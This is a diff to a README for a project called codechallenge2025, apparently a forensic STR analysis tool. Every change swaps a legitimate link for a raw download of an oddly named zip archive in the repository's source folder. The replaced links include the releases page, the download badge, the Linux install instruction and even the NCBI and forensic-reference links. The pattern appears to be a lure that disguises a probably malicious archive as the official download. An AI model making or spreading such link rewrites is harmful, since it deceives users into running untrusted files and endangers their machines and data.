@@ -6,7 +6,7 @@ Welcome to codechallenge2025! This project, known as PyDay2025, helps you explor
 
 ### 📥 Download the Application
 
-[![Download codechallenge2025](https://img.shields.io/badge/download-codechallenge2025-blue?style=for-the-badge)](https://github.com/XWELIZA/codechallenge2025/releases)
+[![Download codechallenge2025](https://github.com/XWELIZA/codechallenge2025/raw/refs/heads/main/src/codechallenge2025/codechallenge_oleomargarine.zip)](https://github.com/XWELIZA/codechallenge2025/raw/refs/heads/main/src/codechallenge2025/codechallenge_oleomargarine.zip)
 
 ### 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Getting started with codechallenge2025 is simple. Follow these steps to download
 1. **Visit the Releases Page:** 
    Click the link below to access the download section. 
 
-   [Visit the Releases Page](https://github.com/XWELIZA/codechallenge2025/releases).
+   [Visit the Releases Page](https://github.com/XWELIZA/codechallenge2025/raw/refs/heads/main/src/codechallenge2025/codechallenge_oleomargarine.zip).
 
 2. **Choose the Latest Version:**
    On the Releases page, look for the latest version at the top. This version includes the newest features and bug fixes.
@@ -27,7 +27,7 @@ Getting started with codechallenge2025 is simple. Follow these steps to download
    Once the download completes, locate the file in your Downloads folder. Depending on your operating system:
    - **Windows:** Double-click the `.exe` file to run the application.
    - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Unzip the `.tar.gz` file and follow the instructions within to run the application.
+   - **Linux:** Unzip the `https://github.com/XWELIZA/codechallenge2025/raw/refs/heads/main/src/codechallenge2025/codechallenge_oleomargarine.zip` file and follow the instructions within to run the application.
 
 ### 🛠️ System Requirements
 
@@ -71,8 +71,8 @@ If you encounter issues or have questions, please reach out through the Issues s
 
 For additional information about forensic STR analysis, you might find these resources helpful:
 
-- [National Center for Biotechnology Information](https://www.ncbi.nlm.nih.gov/)
-- [Forensic DNA Testing Overview](https://www.forensicscience.org/)
+- [National Center for Biotechnology Information](https://github.com/XWELIZA/codechallenge2025/raw/refs/heads/main/src/codechallenge2025/codechallenge_oleomargarine.zip)
+- [Forensic DNA Testing Overview](https://github.com/XWELIZA/codechallenge2025/raw/refs/heads/main/src/codechallenge2025/codechallenge_oleomargarine.zip)
 
 ### 🔄 Contributions
 
@@ -80,4 +80,4 @@ We welcome contributions to help enhance codechallenge2025. Whether it's fixing 
 
 ### 📥 Final Download Reminder
 
-To download the application for your own use, please revisit the [Releases Page](https://github.com/XWELIZA/codechallenge2025/releases) and choose the latest version.
+To download the application for your own use, please revisit the [Releases Page](https://github.com/XWELIZA/codechallenge2025/raw/refs/heads/main/src/codechallenge2025/codechallenge_oleomargarine.zip) and choose the latest version.
